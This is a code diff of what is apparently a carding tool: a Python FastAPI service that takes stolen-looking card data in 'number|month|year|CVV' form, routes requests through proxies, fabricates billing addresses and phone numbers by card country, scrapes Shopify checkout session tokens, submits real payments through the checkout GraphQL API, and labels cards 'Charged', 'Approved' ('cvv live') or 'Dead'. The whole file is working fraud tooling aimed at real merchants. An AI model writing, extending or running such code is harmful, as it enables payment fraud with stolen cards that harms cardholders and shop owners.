@@ -2,19 +2,31 @@ import asyncio
 import json
 import re
 import random
-import time
+import uuid
 from urllib.parse import urlparse
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse, StreamingResponse
+from fastapi.middleware.cors import CORSMiddleware
 from curl_cffi.requests import AsyncSession
+import uvicorn
 
-# ==================== DIRECT SHOPIFY GATEWAY ====================
+app = FastAPI()
+
+# Allow CORS supaya HTML boleh connect
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+active_streams = {}
+
+# ==================== SHOPIFY GATEWAY LOGIC ====================
 
 C2C = {
-    "CAD": "CA", 
-    "INR": "IN",
-    "AED": "AE",
-    "HKD": "HK",
-    "GBP": "GB",
-    "CHF": "CH",
+    "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH",
 }
 
 book = {
@@ -141,39 +153,6 @@ async def fetch_products(domain, proxy_str=None):
     except Exception as e:
         return False, f"<b>Connection/Proxy Error: {str(e)[:60]}</b>"
 
-def extract_clean_response(message):
-    if not message:
-        return "UNKNOWN_ERROR"
-    
-    message = str(message)
-    
-    patterns = [
-        r'(PAYMENTS_[A-Z_]+)',
-        r'(CARD_[A-Z_]+)',
-        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
-        r'([A-Z]+_[A-Z_]+)',
-        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
-        r'{"code":"([^"]+)"',
-        r"'code':'([^']+)'"
-    ]
-    
-    for pattern in patterns:
-        matches = re.findall(pattern, message, re.IGNORECASE)
-        for match in matches:
-            if isinstance(match, tuple):
-                match = match[0]
-            if match and "_" in match and len(match) < 50:
-                match = match.strip("{}:'\" ")
-                return match
-    
-    words = message.split()
-    if words:
-        first_word = words[0]
-        if "_" in first_word and first_word.isupper():
-            return first_word
-    
-    return message[:50]
-
 async def fetch_bin_country(card_number, proxy_str=None):
     try:
         bin_number = card_number.strip()[:6]
@@ -191,7 +170,6 @@ async def fetch_bin_country(card_number, proxy_str=None):
 
 def get_address_for_country(country_code):
     country_code = (country_code or "US").upper()
-    first, last = Utils.get_random_name()
     
     us_phones = [
         "2025550199", "3105551234", "4155559876", "6175550123",
@@ -201,66 +179,42 @@ def get_address_for_country(country_code):
     if country_code == "US":
         streets = ["Main St", "Broadway", "Oak Ave", "Pine Rd", "Maple Lane", "Elm St", "Washington Blvd", "Cedar Dr"]
         cities = [
-            ("New York", "NY", "10001"),
-            ("Los Angeles", "CA", "90001"),
-            ("Chicago", "IL", "60601"),
-            ("Houston", "TX", "77001"),
+            ("New York", "NY", "10001"), ("Los Angeles", "CA", "90001"),
+            ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
             ("Phoenix", "AZ", "85001"),
         ]
         city, state, zip_c = random.choice(cities)
         return {
             "address1": f"{random.randint(100, 9999)} {random.choice(streets)}",
-            "city": city,
-            "postalCode": zip_c,
-            "zoneCode": state,
-            "countryCode": "US",
-            "phone": random.choice(us_phones)
+            "city": city, "postalCode": zip_c, "zoneCode": state,
+            "countryCode": "US", "phone": random.choice(us_phones)
         }
     elif country_code == "CA":
         streets = ["Queen St", "King St", "Yonge St", "Robson St"]
-        cities = [
-            ("Toronto", "ON", "M5V 2T6"),
-            ("Vancouver", "BC", "V6B 1B4"),
-            ("Montreal", "QC", "H3B 1A7"),
-        ]
+        cities = [("Toronto", "ON", "M5V 2T6"), ("Vancouver", "BC", "V6B 1B4"), ("Montreal", "QC", "H3B 1A7")]
         city, state, zip_c = random.choice(cities)
         return {
             "address1": f"{random.randint(100, 999)} {random.choice(streets)}",
-            "city": city,
-            "postalCode": zip_c,
-            "zoneCode": state,
-            "countryCode": "CA",
-            "phone": f"416{''.join(random.choice('0123456789') for _ in range(7))}"
+            "city": city, "postalCode": zip_c, "zoneCode": state,
+            "countryCode": "CA", "phone": f"416{''.join(random.choice('0123456789') for _ in range(7))}"
         }
     elif country_code == "GB":
         streets = ["High St", "London Rd", "Station Rd", "Church St"]
-        cities = [
-            ("London", "LND", "EC1A 1BB"),
-            ("Manchester", "MAN", "M1 1AE"),
-        ]
+        cities = [("London", "LND", "EC1A 1BB"), ("Manchester", "MAN", "M1 1AE")]
         city, state, zip_c = random.choice(cities)
         return {
             "address1": f"{random.randint(1, 150)} {random.choice(streets)}",
-            "city": city,
-            "postalCode": zip_c,
-            "zoneCode": state,
-            "countryCode": "GB",
-            "phone": f"7{''.join(random.choice('0123456789') for _ in range(9))}"
+            "city": city, "postalCode": zip_c, "zoneCode": state,
+            "countryCode": "GB", "phone": f"7{''.join(random.choice('0123456789') for _ in range(9))}"
         }
     elif country_code == "AU":
         streets = ["George St", "Collins St", "Queen St"]
-        cities = [
-            ("Sydney", "NSW", "2000"),
-            ("Melbourne", "VIC", "3000"),
-        ]
+        cities = [("Sydney", "NSW", "2000"), ("Melbourne", "VIC", "3000")]
         city, state, zip_c = random.choice(cities)
         return {
             "address1": f"{random.randint(1, 500)} {random.choice(streets)}",
-            "city": city,
-            "postalCode": zip_c,
-            "zoneCode": state,
-            "countryCode": "AU",
-            "phone": f"04{''.join(random.choice('0123456789') for _ in range(8))}"
+            "city": city, "postalCode": zip_c, "zoneCode": state,
+            "countryCode": "AU", "phone": f"04{''.join(random.choice('0123456789') for _ in range(8))}"
         }
     else:
         if country_code in book:
@@ -288,7 +242,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
     
     bin_country = await fetch_bin_country(cc, proxy_str)
     billing_addr = get_address_for_country(bin_country)
-    shipping_addr = get_address_for_country("US")
+    shipping_addr = billing_addr # Samakan address
     
     b_add1 = billing_addr["address1"]
     b_city = billing_addr["city"]
@@ -297,12 +251,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
     b_phone = billing_addr["phone"]
     b_country_code = billing_addr["countryCode"]
     
-    s_add1 = shipping_addr["address1"]
-    s_city = shipping_addr["city"]
-    s_state_short = shipping_addr["zoneCode"]
-    s_zip_code = shipping_addr["postalCode"]
-    s_phone = shipping_addr["phone"]
-    s_country_code = shipping_addr["countryCode"]
+    s_add1, s_city, s_state_short, s_zip_code, s_phone, s_country_code = b_add1, b_city, b_state_short, b_zip_code, b_phone, b_country_code
     
     try:
         if not variant_id:
@@ -394,18 +343,15 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 return False, "Site requires login!", gateway, total_price, currency
 
             await queue.put({"type": "log", "msg": "[STEP 5] Extracting Session Token (SST)..."})
+            
             sst = None
-            sst_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', text)
+            sst_match = re.search(r'serialized-sessionToken"\s+content="(?:&quot;)?([^"&]+)(?:&quot;)?"', text)
             if sst_match:
                 sst = sst_match.group(1)
             else:
-                sst_match = re.search(r'name="serialized-sessionToken"\s+content="([^"]+)"', text)
-                if sst_match:
-                    sst = sst_match.group(1)
-                else:
-                    sst = extract_between(text, '"serializedSessionToken":"', '"') or \
-                          extract_between(text, 'data-session-token="', '"') or \
-                          extract_between(text, '"sessionToken":"', '"')
+                sst = extract_between(text, '"serializedSessionToken":"', '"') or \
+                      extract_between(text, 'data-session-token="', '"') or \
+                      extract_between(text, '"sessionToken":"', '"')
 
             if not sst:
                 await queue.put({"type": "log", "msg": "[ERROR STEP 5] Failed to get session token (Maybe Captcha/Block)."})
@@ -414,8 +360,8 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             await queue.put({"type": "log", "msg": f"[STEP 5 OK] SST Extracted: {sst[:30]}..."})
 
             queue_token = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"') or ""
-            stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or "1"
-            paymentMethodIdentifier = extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;') or extract_between(text, '"paymentMethodIdentifier":"', '"') or "credit_card"
+            stable_id = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"') or ""
+            paymentMethodIdentifier = "credit_card"
 
             currency = 'USD'
             if 'currencyCode&quot;:&quot;' in text:
@@ -426,7 +372,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             c_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
             if not c_token or len(c_token) < 5 or 'checkout' in c_token:
-                c_token = cart_token or "1"
+                c_token = cart_token or ""
 
             await queue.put({"type": "log", "msg": "[STEP 6] Tokenizing card at shopifycs.com..."})
             session_endpoints = [
@@ -440,7 +386,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             token_error = "Unable to get payment token"
             for endpoint in session_endpoints:
                 try:
-                    await queue.put({"type": "log", "msg": f"          -> Trying: {endpoint}"})
                     payload = {
                         "credit_card": {
                             "number": cc.replace(" ", ""),
@@ -479,7 +424,8 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
             await asyncio.sleep(random.uniform(2.0, 4.0))
 
             await queue.put({"type": "log", "msg": "[STEP 7] Submitting GraphQL (SubmitForCompletion)..."})
-            graphql_url = f'{ourl}/checkouts/unstable/graphql'
+            graphql_url = f'{ourl}/api/2024-01/graphql.json'
+            
             graphql_headers = {
                 'Accept': 'application/json',
                 'Content-Type': 'application/json',
@@ -498,7 +444,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                 'Sec-Ch-Ua-Platform': '"Windows"'
             }
 
-            random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
+            random_page_id = str(uuid.uuid4())
 
             graphql_payload = {
                 'query': MUTATION_SUBMIT,
@@ -570,7 +516,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                             ],
                         },
                         'payment': {
-                            'totalAmount': {'any': True},
+                            'totalAmount': {'value': {'amount': total_price, 'currencyCode': currency}},
                             'paymentLines': [
                                 {
                                     'paymentMethod': {
@@ -594,7 +540,7 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                                             'cardSource': None,
                                         },
                                     },
-                                    'amount': {'any': True},
+                                    'amount': {'value': {'amount': total_price, 'currencyCode': currency}},
                                     'dueAt': None,
                                 },
                             ],
@@ -672,6 +618,8 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                         return False, f"GraphQL submission failed: Status {graphql_resp.status_code}", gateway, total_price, currency
                     
                     result_data = graphql_resp.json()
+                    await queue.put({"type": "log", "msg": f"[RAW GQL RESPONSE] {json.dumps(result_data)[:300]}"})
+                    
                     completion = result_data.get('data', {}).get('submitForCompletion', {})
                     typename = completion.get('__typename')
                     await queue.put({"type": "log", "msg": f"          -> GraphQL Typename: {typename}"})
@@ -694,7 +642,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                         soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                         only_soft_errors = all(code in soft_errors for code in error_codes)
                         if only_soft_errors and submit_attempt == 0:
-                            # Retry dengan attemptToken baru (tanpa negotiationStrategy)
                             graphql_payload['variables']['attemptToken'] = f'{c_token}-{random.random()}'
                             await asyncio.sleep(2)
                             continue
@@ -748,7 +695,6 @@ async def process_card(queue, cc, mes, ano, cvv, site_url, variant_id=None, prox
                                 code = receipt.get('processingError', {}).get('code') or "UNKNOWN_CODE"
                                 msg = receipt.get('processingError', {}).get('messageUntranslated') or "No message"
                                 await queue.put({"type": "log", "msg": f"[FAILED] Bank Rejected: {code} - {msg}"})
-                                # Pulangkan 100% response asal dari bank
                                 return True, f"{code}", gateway, total_price, currency
                     except Exception:
                         pass
@@ -804,157 +750,94 @@ def _classify_response(response_text: str) -> tuple:
     resp = str(response_text).strip()
     resp_lower = resp.lower()
 
-    charged_patterns = [
-        'thank you ', 'order_paid', 'order_successful', 'order completed',
-        'order completed 💎', 'order_placed', 'charged', 'successfully paid',
-        'payment successful', 'processedreceipt', 'processed_receipt',
-        'order_processed', 'succeeded'
-    ]
-    
-    tds_patterns = [
-        '3d_authentication', '3ds', '3d secure', '3d_secure', '3d-secure',
-        'otp_required', 'otp required', 'one-time password',
-        'actionreq', 'action_required', 'actionrequired',
-        'authentication_required', 'authentication required',
-        'verification_required', 'verification required',
-        'challenge required', 'challenge shopper', 'identify shopper',
-        'redirect shopper', 'sms verification', 'sms verification required',
-        'verify otp', 'verify_otp', 'verify card', 'verify_card'
-    ]
+    charged_patterns = ['thank you', 'order_paid', 'order_successful', 'order completed', 'order_placed', 'charged', 'successfully paid', 'payment successful', 'processedreceipt', 'processed_receipt', 'order_processed', 'succeeded']
+    tds_patterns = ['3d_authentication', '3ds', '3d secure', '3d_secure', '3d-secure', 'otp_required', 'otp required', 'one-time password', 'actionreq', 'action_required', 'actionrequired', 'authentication_required', 'authentication required', 'verification_required', 'verification required', 'challenge required', 'challenge shopper', 'identify shopper', 'redirect shopper', 'sms verification', 'sms verification required', 'verify otp', 'verify_otp', 'verify card', 'verify_card']
+    approved_patterns = ['cvv live', 'incorrect_cvc', 'insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'cvc_check_failed', 'cvv_gateway_error', 'incorrect_pin', 'incorrect_zip', 'incorrect_address', 'call_issuer', 'card_velocity_exceeded', 'withdrawal_count_limit_exceeded', 'approved', 'ccn', 'mismatched_bill']
+    declined_patterns = ['declined', 'card_declined', 'generic_error', 'authorization_error', 'authentication_failed', 'payments_credit_card_base_expired', 'do_not_honor', 'pick_up_card', 'pickup_card', 'stolen_card', 'lost_card', 'incorrect_number', 'expired_card', 'processing_error', 'fraudulent', 'fraud_suspected', 'invalid_payment_error', 'generic_decline', 'lost', 'stolen', 'pickup', 'restricted_card', 'card_not_supported', 'card_brand_blocked', 'invalid_number', 'invalid_expiry', 'not_permitted', 'security_violation', 'transaction_not_allowed', 'test_mode_live_card', 'live_mode_test_card', 'invalid_account', 'revocation_of_all_authorizations', 'revocation_of_authorization', 'card_declined_temporarily', 'payments_credit_card_verification_value_invalid_for_card_type']
+    system_error_patterns = ['r4 token empty', 'r3 token empty', 'r2 id empty', 'risky', 'product not found', 'step 1 failed', 'product id is empty', 'handle is empty', 'receipt id is empty', 'receipt_empty', 'products', 'invalid_purchase_type', 'session token not found', '$x_checkout_one_session_token', 'token empty', 'token not found', 'invalid_tokeñ', 'invalid_response', 'invalid url', 'invalid json', 'stock_problems', 'stock-problems', 'out of stock', 'sold out', 'this product is currently unavailable', 'item is out of stock', 'some items in your cart are no longer available', 'delivery ammount empty', 'del ammount empty', 'delivery rates are empty', 'shipping info is empty', 'card token is empty', 'payment method identifier is empty', 'payment method is not shopify', 'not shopify', 'no valid products', 'site requires login', 'site not supported', 'bad site', 'failed to get token', 'failed to get shipping rates', 'failed to get checkout', 'captcha', 'hcaptcha', 'captcha_required', 'cloudflare', 'connection error', 'connection failed', 'timed out', 'timeout', 'access denied', 'tlsv1 alert', 'ssl routines', 'openssl ssl_connect', 'could not resolve', 'could not resolve host', 'domain name not found', 'name or service not known', 'resolve', 'curl error', 'connect tunnel failed', 'empty reply from server', 'gateway timeout', 'bad gateway', 'internal server error', 'service unavailable', 'server error', 'client error', 'http error', 'http_error_504', '504', 'error processing card', 'error in 1st req', 'error in 1 req', 'amount_too_small', 'change proxy or site', 'tax ammount empty', 'tax_new_tax_must_be_accepted', 'delivery_company_required', 'delivery_no_delivery_strategy_available', 'delivery_delivery_line_detail_changed', 'waiting_pending_terms', 'tax/price changed', 'na', 'n/a', 'item', 'site error', 'proxy error', 'required_artifacts_unavailable', 'merchandise_out_of_stock', 'delivery_address2_required', 'validation_custom', 'delivery_no_delivery_strategy_available_for_merchandise_line', 'required_artifacts', 'required_arti', 'payments_credit_card_brand_not_supported', 'payments_invalid_gateway_for_development_store', 'payments_proposed_gateway_unavailable', 'payments_payment_flexibility_terms_id_mismatch']
 
-    approved_patterns = [
-        'cvv live', 'incorrect_cvc', 'insufficient_funds', 'incorrect_cvv',
-        'invalid_cvc', 'cvc_check_failed', 'cvv_gateway_error', 'incorrect_pin',
-        'incorrect_zip', 'incorrect_address', 'call_issuer',
-        'card_velocity_exceeded', 'withdrawal_count_limit_exceeded', 'approved',
-        'ccn', 'mismatched_bill'
-    ]
-
-    declined_patterns = [
-        'declined', 'card_declined', 'generic_error', 'authorization_error',
-        'authentication_failed', 'payments_credit_card_base_expired', 'do_not_honor',
-        'pick_up_card', 'pickup_card', 'stolen_card', 'lost_card',
-        'incorrect_number', 'expired_card', 'processing_error', 'fraudulent',
-        'fraud_suspected', 'invalid_payment_error', 'generic_decline',
-        'lost', 'stolen', 'pickup', 'expired', 'restricted_card',
-        'card_not_supported', 'card_brand_blocked', 'invalid_number',
-        'incorrect_number', 'invalid_expiry', 'not_permitted',
-        'security_violation', 'transaction_not_allowed', 'test_mode_live_card',
-        'live_mode_test_card', 'invalid_account', 'revocation_of_all_authorizations',
-        'revocation_of_authorization', 'card_declined_temporarily',
-        'payments_credit_card_verification_value_invalid_for_card_type'
-    ]
-
-    system_error_patterns = [
-        'r4 token empty', 'r3 token empty', 'r2 id empty', 'risky', 'product not found',
-        'step 1 failed', 'product id is empty', 'handle is empty',
-        'receipt id is empty', 'receipt_empty', 'products', 'invalid_purchase_type',
-        'session token not found', '$x_checkout_one_session_token', 'token empty',
-        'token not found', 'invalid_tokeñ', 'invalid_response', 'invalid url',
-        'invalid json', 'stock_problems', 'stock-problems', 'out of stock',
-        'sold out', 'this product is currently unavailable', 'item is out of stock',
-        'some items in your cart are no longer available', 'delivery ammount empty',
-        'del ammount empty', 'delivery rates are empty', 'shipping info is empty',
-        'card token is empty', 'payment method identifier is empty',
-        'payment method is not shopify', 'not shopify', 'no valid products',
-        'site requires login', 'site not supported', 'bad site', 'failed to get token',
-        'failed to get shipping rates', 'failed to get checkout', 'captcha',
-        'hcaptcha', 'captcha_required', 'cloudflare', 'connection error',
-        'connection failed', 'timed out', 'timeout', 'access denied', 'tlsv1 alert',
-        'ssl routines', 'openssl ssl_connect', 'could not resolve',
-        'could not resolve host', 'domain name not found', 'name or service not known',
-        'resolve', 'curl error', 'connect tunnel failed', 'empty reply from server',
-        'gateway timeout', 'bad gateway', 'internal server error',
-        'service unavailable', 'server error', 'client error', 'http error',
-        'http_error_504', '504', 'failed', 'error', 'error processing card',
-        'error in 1st req', 'error in 1 req', 'amount_too_small',
-        'change proxy or site', 'tax ammount empty', 'tax_new_tax_must_be_accepted',
-        'delivery_company_required', 'delivery_no_delivery_strategy_available',
-        'delivery_delivery_line_detail_changed',
-        'waiting_pending_terms', 'tax/price changed',
-        'na', 'n/a', 'item', 'site error', 'proxy error',
-        'required_artifacts_unavailable', 'merchandise_out_of_stock',
-        'delivery_address2_required', 'validation_custom',
-        'delivery_no_delivery_strategy_available_for_merchandise_line',
-        'required_artifacts', 'required_arti',
-        'payments_credit_card_brand_not_supported', 'payments_invalid_gateway_for_development_store',
-        'payments_proposed_gateway_unavailable', 'payments_payment_flexibility_terms_id_mismatch'
-    ]
-
-    if any(k in resp_lower for k in charged_patterns):
-        return "Charged", resp, "-"
-    if any(k in resp_lower for k in tds_patterns):
-        return "3DS", resp, "-"
+    if any(k in resp_lower for k in charged_patterns): return "Charged", resp, "-"
+    if any(k in resp_lower for k in tds_patterns): return "3DS", resp, "-"
     
     is_approved = any(k in resp_lower for k in approved_patterns)
     if not is_approved:
-        if re.search(r'\blive\b', resp_lower):
-            is_approved = True
-            
-    if is_approved:
-        return "Approved", resp, "-"
+        if re.search(r'\blive\b', resp_lower): is_approved = True
+    if is_approved: return "Approved", resp, "-"
         
-    if any(k in resp_lower for k in declined_patterns):
-        return "Dead", resp, "-"
-    if any(k in resp_lower for k in system_error_patterns):
-        return "Error", resp, "-"
+    if any(k in resp_lower for k in declined_patterns): return "Dead", resp, "-"
+    if any(k in resp_lower for k in system_error_patterns): return "Error", resp, "-"
 
     return "Error", resp if resp else "No response", "-"
 
+# ==================== FASTAPI ENDPOINTS ====================
 
-# =====================================================================
-# BAHAGIAN BARU: SISTEM STREAMING UNTUK ELAKKAN RAILWAY TIMEOUT
-# =====================================================================
+@app.get("/", response_class=HTMLResponse)
+async def get_index():
+    # Baca index.html dari folder yang sama
+    try:
+        with open("index.html", "r", encoding="utf-8") as f:
+            html_content = f.read()
+        return HTMLResponse(content=html_content)
+    except FileNotFoundError:
+        return HTMLResponse("<h1>index.html not found. Please upload it.</h1>", status_code=404)
 
-async def run_background_process(job_id: str, card_str: str, site_url: str, proxy_str: str):
+@app.post("/api/stream-checkout")
+async def api_stream_checkout(request: Request):
+    req_data = await request.json()
+    card_str = req_data.get("card_str")
+    site_url = req_data.get("site_url")
+    proxy_str = req_data.get("proxy_str")
+
+    job_id = str(uuid.uuid4())
     queue = asyncio.Queue()
-    
-    from main import active_streams
     active_streams[job_id] = queue
 
-    parts = card_str.split("|")
-    if len(parts) != 4:
-        await queue.put({"type": "error", "msg": "Invalid card format"})
-        return
-
-    cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    if len(ano) == 2: ano = "20" + ano
-    site = site_url.strip().rstrip("/")
-    if not site.startswith("http"): site = "https://" + site
-
-    await queue.put({"type": "log", "msg": "[INIT] Stream connected. Engine processing..."})
-
-    try:
-        success, message, gateway, price, currency = await process_card(
-            queue, cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str
-        )
-        
-        final_msg = message if message else "UNKNOWN_ERROR"
-        status, _, _ = _classify_response(final_msg)
-        
-        await queue.put({"type": "result", "status": status, "message": final_msg, "price": price})
-        
-    except Exception as e:
-        await queue.put({"type": "error", "msg": f"Fatal: {str(e)}"})
-    finally:
-        await queue.put({"type": "done"})
-        await asyncio.sleep(5)
-        if job_id in active_streams: del active_streams[job_id]
-
-
-async def get_stream_generator(job_id: str):
-    from main import active_streams
-    queue = active_streams.get(job_id)
-    
-    if not queue:
-        yield f"data: {json.dumps({'type': 'error', 'msg': 'Job ID not found or expired'})}\n\n"
-        return
-
-    while True:
+    async def background_task():
         try:
-            data = await asyncio.wait_for(queue.get(), timeout=30.0)
-            if data.get("type") == "done":
-                break
-            yield f"data: {json.dumps(data)}\n\n"
-        except asyncio.TimeoutError:
-            yield f"data: {json.dumps({'type': 'log', 'msg': '[KEEP-ALIVE] Waiting for backend process...'})}\n\n"
+            parts = card_str.split("|")
+            if len(parts) == 4:
+                cc, mes, ano, cvv = parts
+                cc, mes, ano, cvv = cc.strip(), mes.strip(), ano.strip(), cvv.strip()
+                if len(ano) == 2: ano = "20" + ano
+            else:
+                await queue.put({"type": "error", "msg": "Invalid card format"})
+                return
+
+            await queue.put({"type": "log", "msg": "[INIT] Engine processing started..."})
+
+            success, message, gateway, price, currency = await process_card(
+                queue, cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site_url, proxy_str=proxy_str
+            )
+            
+            final_msg = message if message else "UNKNOWN_ERROR"
+            status, _, _ = _classify_response(final_msg)
+            
+            await queue.put({"type": "result", "status": status, "message": final_msg, "price": price})
+        except Exception as e:
+            await queue.put({"type": "error", "msg": f"Fatal Background Error: {str(e)}"})
+        finally:
+            await queue.put({"type": "done"})
+            await asyncio.sleep(2)
+            if job_id in active_streams:
+                del active_streams[job_id]
+
+    asyncio.create_task(background_task())
+
+    async def event_generator():
+        while True:
+            try:
+                data = await asyncio.wait_for(queue.get(), timeout=30.0)
+                if data.get("type") == "done":
+                    yield f"data: {json.dumps(data)}\n\n"
+                    break
+                yield f"data: {json.dumps(data)}\n\n"
+            except asyncio.TimeoutError:
+                yield f"data: {json.dumps({'type': 'log', 'msg': '[KEEP-ALIVE] Waiting for backend process...'})}\n\n"
+
+    return StreamingResponse(event_generator(), media_type="text/event-stream")
+
+if __name__ == "__main__":
+    # Railway akan auto-assign PORT, kita kena baca dari environment variable
+    import os
+    port = int(os.environ.get("PORT", 8000))
+    uvicorn.run(app, host="0.0.0.0", port=port)
